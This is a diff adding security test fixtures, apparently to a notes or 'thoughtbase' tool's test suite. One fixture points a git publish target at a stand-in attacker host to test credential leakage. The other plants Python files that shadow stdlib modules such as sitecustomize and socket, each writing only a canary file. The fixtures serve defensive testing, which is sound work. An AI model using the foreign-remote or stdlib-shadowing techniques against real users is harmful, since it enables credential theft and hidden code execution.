@@ -627,3 +627,69 @@ export function writeNoteSqlExfilThoughtbase(rootIn: string): NoteSqlExfilFixtur
     hostileChartCount: spellings.length + 1,
   };
 }
+
+// ── Foreign publish remote (#2556) ──────────────────────────────────────────
+
+/**
+ * A `.minerva/config.json` whose git publish target points at a host the user
+ * never chose — the shape a shared or synced thoughtbase can carry. Publishing
+ * it must not send the user's GitHub credentials anywhere.
+ */
+export const FOREIGN_PUBLISH_REMOTE = 'https://git.attacker.example/collect.git';
+
+export function writeForeignPublishRemoteConfig(root: string, targetId = 'site'): string {
+  const dir = path.join(root, '.minerva');
+  fs.mkdirSync(dir, { recursive: true });
+  const file = path.join(dir, 'config.json');
+  const prior = fs.existsSync(file) ? (JSON.parse(fs.readFileSync(file, 'utf-8')) as Record<string, unknown>) : {};
+  fs.writeFileSync(
+    file,
+    JSON.stringify({
+      ...prior,
+      publish: {
+        targets: [{
+          id: targetId, label: 'Site', exporter: 'static-site', kind: 'git',
+          gitRemote: FOREIGN_PUBLISH_REMOTE, gitBranch: 'gh-pages',
+        }],
+      },
+    }, null, 2),
+  );
+  return targetId;
+}
+
+// ── Python stdlib shadowing (#2555) ─────────────────────────────────────────
+
+/**
+ * Root-level `.py` files a shared thoughtbase could carry to run code in the
+ * compute kernel before the user's (consented) cell does: `sitecustomize` /
+ * `usercustomize` (imported by `site` at interpreter startup if on sys.path)
+ * and modules named like the stdlib ones the kernel imports — `json` eagerly,
+ * `socket` lazily inside the network guard. Each writes a canary file named
+ * after itself into the root if it is ever imported.
+ */
+export const PYTHON_SHADOW_MODULES = ['sitecustomize', 'usercustomize', 'json', 'socket', 'base64'] as const;
+
+export interface PythonShadowFixture {
+  /** Realpath'd root. */
+  root: string;
+  /** Canary files that exist iff the matching shadow module ran. */
+  canaries: Record<(typeof PYTHON_SHADOW_MODULES)[number], string>;
+  /** A legitimate user module at the root: `import tb_helpers; tb_helpers.VALUE == 42`. */
+  userModule: 'tb_helpers';
+}
+
+export function writePythonShadowThoughtbase(rootIn: string): PythonShadowFixture {
+  fs.mkdirSync(rootIn, { recursive: true });
+  const root = fs.realpathSync(rootIn);
+  const canaries = {} as PythonShadowFixture['canaries'];
+  for (const name of PYTHON_SHADOW_MODULES) {
+    const canary = path.join(root, `SHADOW_RAN_${name}`);
+    canaries[name] = canary;
+    fs.writeFileSync(
+      path.join(root, `${name}.py`),
+      `open(${JSON.stringify(canary)}, 'w').write('ran')\n`,
+    );
+  }
+  fs.writeFileSync(path.join(root, 'tb_helpers.py'), 'VALUE = 42\n');
+  return { root, canaries, userModule: 'tb_helpers' };
+}
